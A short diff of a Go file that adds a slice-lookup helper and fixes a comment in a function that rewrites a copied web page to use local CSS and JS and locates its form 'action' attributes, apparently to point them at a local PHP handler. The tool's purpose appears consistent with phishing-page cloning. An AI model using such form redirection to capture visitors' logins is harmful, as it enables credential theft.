@@ -7,6 +7,16 @@ import (
 	"regexp"
 )
 
+// stringInSlice (slice, string): return true if string is found in slice -> used to avoid duplicates
+func find(slice []string, val string) bool {
+	for _, item := range slice {
+		if item == val {
+			return true
+		}
+	}
+	return false
+}
+
 // mkdirIfNotExist (dirpath string): create a directory if it does not exists
 func mkdirIfNotExist(dir string) error {
 	if _, err := os.Stat(dir); os.IsNotExist(err) {
@@ -18,7 +28,7 @@ func mkdirIfNotExist(dir string) error {
 	return nil
 }
 
-// pachHtml (destFolder string): patch html file to take local instances of css and js instead of the remote paths
+// patchHtml (destFolder string): patch html file to take local instances of css and js instead of the remote paths
 func patchHtml(destFolder string, remotePaths []string, localPaths []string, postPath string, phpFilename string) error {
 
 	// open html file
@@ -37,6 +47,7 @@ func patchHtml(destFolder string, remotePaths []string, localPaths []string, pos
 		// replace remote path with local path
 		newContents = bytes.Replace(newContents, []byte(paths), []byte(localPaths[i]), -1)
 	}
+
 	// find action attribute of the POST
 	r, _ := regexp.Compile("(action=\".*?)\"")
 	m := r.FindAllStringSubmatch(string(newContents), -1)
